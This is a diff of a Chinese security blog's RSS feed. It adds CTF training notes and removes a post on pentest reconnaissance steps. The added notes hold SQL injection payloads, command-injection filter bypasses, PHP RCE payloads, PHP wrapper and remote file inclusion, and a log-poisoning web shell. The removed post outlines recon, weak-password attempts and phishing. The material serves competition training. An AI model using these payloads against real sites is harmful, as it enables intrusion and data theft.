@@ -9,8 +9,85 @@
     <atom:link href="http://blog.xingxiaowu.cn/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>一个么的前途的弟中弟</description>
-    <pubDate>Tue, 25 Jun 2024 15:47:07 GMT</pubDate>
+    <pubDate>Thu, 27 Jun 2024 06:52:02 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>赣银杯赛前培训</title>
+      <link>http://blog.xingxiaowu.cn/2024/06/26/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD/</link>
+      <guid>http://blog.xingxiaowu.cn/2024/06/26/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD/</guid>
+      <pubDate>Wed, 26 Jun 2024 12:17:00 GMT</pubDate>
+      
+      <description>&lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select password from users where id = &amp;quot;xiaoming&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;select password from users where id = &amp;quot;&amp;quot; or 1=1#&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;information_schema&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;schemata&lt;/th&gt;
+&lt;th&gt;tables&lt;/th&gt;
+&lt;th&gt;columns&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;数据库名&lt;/td&gt;
+&lt;td&gt;schema_name&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;表名&lt;/td&gt;
+&lt;td&gt;table_schema&lt;/td&gt;
+&lt;td&gt;table_name&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;字段名&lt;/td&gt;
+&lt;td&gt;table_schema&lt;/td&gt;
+&lt;td&gt;table_name&lt;/td&gt;
+&lt;td&gt;column_name&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;nianji&lt;/p&gt;
+&lt;p&gt;liuyi&lt;/p&gt;
+&lt;p&gt;name&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select name from nianji.liuyi;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;联合注入&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select id,username,password from users union select 1,2,3;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;xiaoming&lt;/td&gt;
+&lt;td&gt;xiaoming&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;td&gt;3&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;</description>
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select password from users where id = &quot;xiaoming&quot;</span><br><span class="line"></span><br><span class="line">select password from users where id = &quot;&quot; or 1=1#&quot; </span><br><span class="line"></span><br><span class="line">information_schema</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>schemata</th><th>tables</th><th>columns</th></tr></thead><tbody><tr><td>数据库名</td><td>schema_name</td><td></td><td></td></tr><tr><td>表名</td><td>table_schema</td><td>table_name</td><td></td></tr><tr><td>字段名</td><td>table_schema</td><td>table_name</td><td>column_name</td></tr></tbody></table><p>nianji</p><p>liuyi</p><p>name</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from nianji.liuyi;</span><br></pre></td></tr></table></figure><p>联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password from users union select 1,2,3;</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>1</td><td>xiaoming</td><td>xiaoming</td></tr><tr><td>1</td><td>2</td><td>3</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password from users where id =1 order by 5</span><br><span class="line"></span><br><span class="line">select id,username,password from users where id =1 union select 1,2,3;</span><br><span class="line"></span><br><span class="line">union select 1,database(),3 #    查数据库名</span><br><span class="line"></span><br><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #    查数据表名geek</span><br><span class="line"></span><br><span class="line">union select 1,group_concat(column_name),3 from information_schema.tables where table_name=&#x27;geek&#x27; #查字段名</span><br><span class="line"></span><br><span class="line">union select password from geek #   查最终要的数据 </span><br></pre></td></tr></table></figure><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>读写文件</p><h2 id="1-平替命令"><a href="#1-平替命令" class="headerlink" title="1.平替命令"></a>1.平替命令</h2><ul><li><p>cat 、tac</p></li><li><p>head、tail</p></li><li><p>less、more</p></li><li><p>nl</p></li><li><p>strings</p></li><li><p>paste</p></li><li><p>diff</p></li><li><p>base64 xxxx | base64 -d</p></li></ul><h2 id="2-分隔符"><a href="#2-分隔符" class="headerlink" title="2.分隔符"></a>2.分隔符</h2><ul><li>|</li><li>||</li><li>&amp;</li><li>&amp;&amp;</li><li>;</li><li>%0a</li><li>&gt;</li></ul><h2 id="3-绕过过滤"><a href="#3-绕过过滤" class="headerlink" title="3.绕过过滤"></a>3.绕过过滤</h2><ul><li>关键词过滤</li><li>\    c\at flag.php</li><li>‘ “   c’’a””t flag.php   c”a”t flag.php</li><li>通配符    ca? flag.php   cat fl*   flag.php   fl456789.php</li><li>a&#x3D;ag;b&#x3D;at;c$b fl$a.php</li><li>空格</li><li>cat&lt;&gt;flag.php</li><li>%09   %0b  %0c   %a0  ${IFS}</li><li>$IFS   cat$IFS$2flag.php       cat${IFS}flag.php</li></ul><h2 id="4-使用其他命令"><a href="#4-使用其他命令" class="headerlink" title="4.使用其他命令"></a>4.使用其他命令</h2><ul><li>&#96;</li><li>cat <code>ls</code>      index.php  flag.php readme.txt</li><li>grep -r “flag”</li><li>读取当前目录下所有文件的内容，匹配flag</li><li>base64 &#x2F;flag |  base64 -d        &#x2F;???&#x2F;????64 &#x2F;??4?.???</li><li>echo “cat &#x2F;flag【命令要base64编码】”| base64 -d | bash</li></ul><h2 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">// 对伪协议进行过滤</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">// asd(asd());    </span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure><p>localeconv() 货币信息，第一个是”点“</p><p>current()获取数组中第一个键值对</p><p>scandir()扫描指定目录</p><p>var_dump() 将变量内容进行导出</p><p>next() 将指针向后移动一位show_source()读取某个文件</p><p>readfile() 读文件</p><p>highlight_file()读文件</p><p>file()将某个文件读成数组</p><p>file_get_contents()将某个文件读成字符串</p><p>array_flip() 交换键值对</p><p>array_reverse() 反转数组</p><p>array_rand()获取数组中随机值</p><p>通用payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include include_once()</span><br><span class="line">require require_once()</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;])</span><br></pre></td></tr></table></figure><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>1.data:&#x2F;&#x2F;伪协议</p><p>a.条件</p><p>i.allow_url_fopen &#x3D;On  allow_url_include &#x3D;On</p><p>b.用法</p><p>i.data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo();?></p><p>ii.data:&#x2F;&#x2F;text&#x2F;plain;base,【base64编码的内容】</p><p>iii.data:,<?php phpinfo();?></p><p>2.php:&#x2F;&#x2F;input</p><p>a.条件和上面一样</p><p>b.用法：</p><p>i.include($_GET[‘file’])    ?file&#x3D;php:&#x2F;&#x2F;input</p><p>ii.$_POST:     <?php phpinfo();?></p><p>3.php:&#x2F;&#x2F;filter</p><p>a.php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.<br>php</p><p>b.<code>php://filter/read=convert.base64-encode/resource=xxx. php</code>(读文件源码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`php://filter/write=string.rot13/resource=2.php`(写入文件，相当于打开一个写入的文件流，新建一个文件并指定写的方式)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">`?file=php://filter/write=convert.iconv.UCS-2LE.</span><br><span class="line">    UCS-2BE/resource=payload.php`</span><br><span class="line">`&amp;contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?`</span><br><span class="line"></span><br><span class="line">`php://filter/resource=flag.php`(读文件源码)</span><br><span class="line"></span><br><span class="line">    `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php`(读文件源码)(每两位调换位置写入)</span><br><span class="line"></span><br><span class="line">    `php://filter/read=convert.quoted-printable-encode/resource=flag.php`(读文件源码)</span><br></pre></td></tr></table></figure><p>4.phar:&#x2F;&#x2F;</p><p>a.文件上传： zip,     shell.php -&gt; shell.zip    </p><p>b.文件包含： ?file&#x3D;phar:&#x2F;&#x2F;.&#x2F;shell.zip&#x2F;shell.php</p><p>c.注意：</p><p>i.shell.zip -&gt;shell.jpg    ?file&#x3D;phar:&#x2F;&#x2F;.&#x2F;shell.jpg&#x2F;<br>shell.php</p><p>ii.即使修改后缀，对phar读压缩包也没有影响</p><p>5.compress.zlib:&#x2F;&#x2F;flag.php</p><p>6.zip:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.zip</p><p>a.需要指定绝对路径</p><p>7.zlib:&#x2F;&#x2F;&#96;压缩流</p><p>8.    <code>compress.zlib://a.txt</code>(读文件)</p><p>9.    <code>compress.bzip2://file.bz2</code></p><p>10.http:&#x2F;x.x.x.x:81&#x2F;shell.php</p><p>日志包含</p><p>?file&#x3D;&#x2F;etc&#x2F;passwd</p><p>日志中，记录了一些关键信息：ip 请求时间  请求行  响应行  user-agent</p><p>1.常见日志路径：</p><p>a.nginx: &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>b.apache:   &#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p><p>c.&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p><p>d.&#x2F;var&#x2F;log&#x2F;secure       ssh “<?php phpinfo();?>“@x.x.x.x</p><p>2.请求的时候更改UA头，加上一句话<?php eval($_REQUEST[1])?></p><p>3.重新包含日志，传入参数看一下代码能否执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($file))</span><br><span class="line">&#123;</span><br><span class="line">if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">include ($file . &#x27;.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>怎么序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class test&#123;</span><br><span class="line">public $username;</span><br><span class="line">public $password;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public function hello()&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test&#123;</span><br><span class="line">public $username;</span><br><span class="line">public $password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new test;</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>魔法函数</p><p>__toString():   将对象以字符串形式调用</p><p>__invoke();  以函数形式调用</p><p>__get(); 调用不存在属性触发</p><p>__call()； 调用不存在方法触发</p><p>unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存<br>在，此函数可以重建对象可能具有的任何资源。</p><p>__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。</p><p>__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。</p><p>__toString：当对象被当做一个字符串使用时调用。</p><p>__sleep:序列化对象之前就调用此方法(其返回需要一个数组)</p><p>__wakeup:将在反序列化之后立即被调用，反序列化恢复对象之前<br>调用该方法</p><p>__call:当调用对象中不存在的方法会自动调用该方法。</p><p>__get:在调用私有属性的时候会自动执行</p><p>__isset()在不可访问的属性上调用isset()或empty()触发</p><p>__unset()在不可访问的属性上使用unset()时触发</p><p>__invoke() 将对象当作函数来使用的时候，会自动调用该方法，<br>用“unset()”函数删除对象内部的私有成员属性时，对象会自动用__unset()函数来帮我们删除对象内部的私有成员属性。</p><p>__get()如果试图读取一个对象并不存在的属性的时候，PHP就给出错误信息。如果在类里添加__get方法，并且我们可以用这函数实现类似java中反射的各种操作。</p><h1 id="工具环境"><a href="#工具环境" class="headerlink" title="工具环境"></a>工具环境</h1><p>1.vmware workstation pro 17 及以上</p><p>2.kali <a href="https://www.kali.org/">https://www.kali.org/</a></p><p>3.windows 11 渗透系统</p><p>a.<a href="https://github.com/arch3rPro/Pentest-Windows">https://github.com/arch3rPro/Pentest-Windows</a></p><p>4.CTF toolkit</p><p>a.链接：<a href="https://share.weiyun.com/8cVhjsKl">https://share.weiyun.com/8cVhjsKl</a> 密码：233333</p><ol start="5"><li></li></ol>]]></content:encoded>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/tags/CTF/">CTF</category>
+      
+      
+      <comments>http://blog.xingxiaowu.cn/2024/06/26/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>无星的安全之旅（九）——WebCheckList</title>
@@ -122,37 +199,6 @@
     </item>
     
     <item>
-      <title>无星的渗透之旅速成篇（二）-打点</title>
-      <link>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/</link>
-      <guid>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/</guid>
-      <pubDate>Tue, 07 May 2024 12:09:00 GMT</pubDate>
-      
-      <description>&lt;p&gt;阿星还是个新人&lt;/p&gt;
-&lt;p&gt;不知道正确的渗透步骤是什么&lt;/p&gt;
-&lt;p&gt;这里看到一个打点步骤&lt;/p&gt;
-&lt;p&gt;遂记录下来&lt;/p&gt;
-&lt;h1 id=&quot;打点的基本方法&quot;&gt;&lt;a href=&quot;#打点的基本方法&quot; class=&quot;headerlink&quot; title=&quot;打点的基本方法&quot;&gt;&lt;/a&gt;打点的基本方法&lt;/h1&gt;&lt;p&gt;基本方法，无非就是信息搜集–&amp;gt;找到脆弱资产–&amp;gt;漏洞利用→getshell，说起来是很简单的。&lt;/p&gt;
-&lt;p&gt;这其中最肝的一个部分，莫过于信息搜集了，纯体力活。&lt;/p&gt;
-&lt;p&gt;当然，过程可以用工具相对优化，但我依旧认为是最无脑的一个部分，就像大学生和小学生（高阶和低阶技术人员）一起用计算器（各种工具 fofa goby oneforall等）来算1w道加减乘除题（大量的资产 域名子域名 c段等）一样，其实是区分不开技术人员的水平的，很多头部的公司早就认识到了这一点，于是在大型攻防演练中，通常是派大量的人来进行资产收集，然后筛选出其中的脆弱资产后把资产给后续的利用人员来进内网快速拿分。&lt;/p&gt;
-&lt;p&gt;虽然信息搜集很无脑，但是该说还是得说，这个事情一般有以下几个步骤。&lt;/p&gt;
-&lt;p&gt;1、当项目经理告诉了你攻击目标的时候 →得到公司名→上企查查搜公司名→搜出来一堆公司和子公司&lt;/p&gt;</description>
-      
-      
-      
-      <content:encoded><![CDATA[<p>阿星还是个新人</p><p>不知道正确的渗透步骤是什么</p><p>这里看到一个打点步骤</p><p>遂记录下来</p><h1 id="打点的基本方法"><a href="#打点的基本方法" class="headerlink" title="打点的基本方法"></a>打点的基本方法</h1><p>基本方法，无非就是信息搜集–&gt;找到脆弱资产–&gt;漏洞利用→getshell，说起来是很简单的。</p><p>这其中最肝的一个部分，莫过于信息搜集了，纯体力活。</p><p>当然，过程可以用工具相对优化，但我依旧认为是最无脑的一个部分，就像大学生和小学生（高阶和低阶技术人员）一起用计算器（各种工具 fofa goby oneforall等）来算1w道加减乘除题（大量的资产 域名子域名 c段等）一样，其实是区分不开技术人员的水平的，很多头部的公司早就认识到了这一点，于是在大型攻防演练中，通常是派大量的人来进行资产收集，然后筛选出其中的脆弱资产后把资产给后续的利用人员来进内网快速拿分。</p><p>虽然信息搜集很无脑，但是该说还是得说，这个事情一般有以下几个步骤。</p><p>1、当项目经理告诉了你攻击目标的时候 →得到公司名→上企查查搜公司名→搜出来一堆公司和子公司</p><p>2、拿到这堆公司和子公司的名字→oneforall来跑一遍→然后得到了一堆子域名</p><p>3、拿到这堆子域名丢给Eeyes跑一遍→得到对应子域名对应的ip和c段信息</p><p>4、将对应ip和c段丢给fofa和fscan→fofa能快速得到c段资产信息，fscan能快速扫一遍，顺便帮你打一下常用漏洞</p><p>5、如果你的运气足够好，这个时候fscan已经有漏洞爆出来了，可以直接去利用了（小概率事件），但是如果你的运气不好，就要看接下来的第6步</p><p>6、刚刚fofa得到的资产看一眼，这里可以配合ehole的指纹识别来帮助快速筛选，通过筛选敏感资产，例如shiro，fastjson等直接能够反序列化getshell的资产（小概率事件），如果你的运气好，那么这个时候已经有漏洞了，可以直接利用了，如果你的运气不好，就要看接下来的第7步</p><p>7、通过上面一番筛选，时间已经过去很久了，但是目前却毫无进展，其实心里有点郁闷，这个时候就不建议再搞了，先休息一下，调整下心态，不然后续的几天会大幅度降低工作效率，休息好了感觉又可以了，就看看下面的步骤8继续吧</p><p>8、其实经过上面的一番筛选，web这块的基本已经过完了，但是依旧还没有漏洞，说明这个系统平时自查搞的比较多，基本的高危漏洞修复已经完成了，如果是大型攻防演练，那就建议换个目标再用上面的方法轮一次，如果是就某家单位做的定向攻防，就继续看步骤9吧</p><p>9、web的过完了，虽然没有直接能够rce的系统，但是我们获得了很多形形色色的登录后台\用户登录\注册\管理员登录等等等等交互类型的资产，这些资产虽然看起来没用，但是我这里要介绍一下攻防演练的三板斧漏洞，运气好的话，这些资产还是能够派上用场的</p><p>三板斧其一 反序列化漏洞：这个不用多说，我最喜欢的漏洞，只要有了这个漏洞，基本一台机子的shell就拿到了，看到就眼睛放光，但是可遇不可求，遍地都是shiro的时代已经渐渐过去了。</p><p>三板斧其二 文件上传：这个也是老熟人了，一般我会先看看是不是白名单，是白名单的话，就看看有没有文件包含之类的漏洞能组合利用下，如果是黑名单，就把文件上传的姿势对着上传点全部来一遍，看看有没有一个能中，如果能中，那就有了一个shell（没路径连不上但是确实是shell），虽然找上传路径也是一个拦路虎，但是至少比传不上去强。</p><p>三板斧其三 sql注入：这个更加老熟人了，注入之后，低权限，直接gg，高权限，试试吧，看能不能上shell。</p><p>至于其他漏洞，攻防演练就那么几天时间，八成是用不上，建议直接放弃，就把上面三个玩精（仅仅就攻防项目来说）。</p><p>10、对各种登录系统尝试弱口令&#x2F;sql注入攻击，弱口令能登进去后台就找上传点，sql注入建议xray+burp来测，看到有戏的再上sqlmap。</p><p>还有一些信息搜集的方法，比如fofa搜关键字，title&#x3D;”单位名”等，这种方法可以自行穿插灵活使用，有时候有奇效，有时候没啥效果，看个人造化了。</p><p>还有些天选之人，直接一个弱口令登云桌面（horizon、vdi等）然后拿shell的，这种属于天赐shell，不在常规考虑范围之内，但也可以尝试。</p><p>11、弱口令如果爆不出账号密码，就考虑上网盘\github\sgk\泄露公开库搜对应人员的信息，看看好使不</p><p>12、如果还是没有用，就可以开始看公众号\app\小程序的信息</p><p>13、如果还是没有用，就要开始用域传送\备案号\ip反查网站\ssl证书\用google来搜c段</p><p>14、如果还是没有用，就用dirmap\dirsearch来对可疑的网站进行目录爆破，看看好使不</p><p>15、如果还是没有用，还可以钓鱼，发邮件也是一个体力活</p><p>16、如果还是没有用，拿上设备跟领导申请近源渗透吧</p><p>列了这么多，我就是想说明，虽然信息搜集是一项很重要的工作，是开启后渗透的基础，但这项工作是体力活真的是不争的事实，因为他没有门槛，基本谁都能做，无非就是用工具对着一项项checklist不断的去尝试而已。</p><p>因此通常意义上的快速打点，就是比谁先试完所有的checklist，虽然目前绝大部分工作都是由工 具来完成，整个项目呈一个半自动化的流程，但是仍然架不住资产量的庞大，一个信息收集熟练的人，无非也就是流水线的工人而已，对着巨量的资产不断的用工具筛选而已。</p><p>而一些高端打点技巧玩得好的人，例如电话钓鱼成功率很大的人，钓鱼邮件的撰写和钓鱼样本的开发做的很牛的人，在做这些事情之前，同样需要信息搜集，而能够玩高端技巧的人是不愿意来做信息搜集的，因为他们也是从小白阶段过来的，明白信息搜集这项繁重且技术含量低的工作完全可以找别人来做。</p><p>从公司层面上来讲，要快速打点，就要投入更多的人。从个人层面上来讲，要快速打点，要忍受枯燥的打点过程，然后提升自己的工具使用速度，最好自己能够进行二次开发，把一些半自动化的步骤连接起来，优化现有的步骤，从而进一步提升效率。</p>]]></content:encoded>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
-      
-      
